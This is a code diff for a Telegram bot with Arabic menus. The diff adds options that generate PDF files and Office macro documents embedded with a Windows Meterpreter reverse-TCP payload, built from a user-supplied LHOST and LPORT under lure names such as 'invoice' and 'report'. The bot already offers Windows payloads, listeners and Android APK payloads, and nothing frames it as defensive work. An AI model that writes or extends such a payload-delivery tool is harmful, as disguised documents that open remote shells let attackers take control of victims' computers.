@@ -53,6 +53,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("بايلود ويندوز", callback_data="kind:payload")],
         [InlineKeyboardButton("مستمع (Listener)", callback_data="kind:listener")],
         [InlineKeyboardButton("Android APK", callback_data="kind:android")],
+        [InlineKeyboardButton("PDF مضمَّن", callback_data="kind:pdf")],
+        [InlineKeyboardButton("مستند Office", callback_data="kind:office")],
     ]
     intro = (
         "اختر نوع المهمة:\n"
@@ -112,6 +114,22 @@ async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "سيُستخدم APK عيّنة وسيتم إرسال الناتج لك."
         )
         await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "pdf":
+        txt = (
+            "توليد PDF مضمَّن بالبايلود.\n"
+            "أرسل: LHOST LPORT [OUTPUT_NAME]\n"
+            "مثال: 127.0.0.1 4444 report\n"
+            "إن لم تذكر OUTPUT_NAME سيُستخدم document افتراضياً."
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
+    elif kind == "office":
+        txt = (
+            "توليد مستند ماكرو.\n"
+            "أرسل: TARGET LHOST LPORT OUTPUT_NAME\n"
+            "TARGET أحد: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux\n"
+            "مثال: ms_word_windows 127.0.0.1 4444 invoice\n"
+        )
+        await query.edit_message_text(txt, reply_markup=back_kb)
     else:
         await query.edit_message_text("خيار غير مدعوم")
         return ConversationHandler.END
@@ -145,6 +163,27 @@ async def params_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         lhost, lport = parts[:2]
         payload = "android/meterpreter/reverse_tcp"
         sess.params = {"lhost": lhost, "lport": lport, "payload": payload}
+    elif sess.kind == "pdf":
+        if len(parts) < 2:
+            await update.message.reply_text("الاستخدام: LHOST LPORT [OUTPUT_NAME]\nمثال: 127.0.0.1 4444 report")
+            return PARAMS
+        lhost, lport = parts[0], parts[1]
+        output_name = parts[2] if len(parts) >= 3 else "document"
+        payload = "windows/meterpreter/reverse_tcp"
+        sess.params = {"lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
+        sess.kind = "pdf"
+    elif sess.kind == "office":
+        if len(parts) < 4:
+            await update.message.reply_text("الاستخدام: TARGET LHOST LPORT OUTPUT_NAME\nمثال: ms_word_windows 127.0.0.1 4444 invoice")
+            return PARAMS
+        target, lhost, lport, output_name = parts[:4]
+        valid = {"ms_word_windows","ms_word_mac","openoffice_windows","openoffice_linux"}
+        if target not in valid:
+            await update.message.reply_text("TARGET غير صحيح. استخدم: ms_word_windows | ms_word_mac | openoffice_windows | openoffice_linux")
+            return PARAMS
+        payload = "windows/meterpreter/reverse_tcp"
+        sess.params = {"suite_target": target, "lhost": lhost, "lport": lport, "payload": payload, "output_name": output_name}
+        sess.kind = "office"
     else:
         await update.message.reply_text("خيار غير مدعوم")
         return ConversationHandler.END
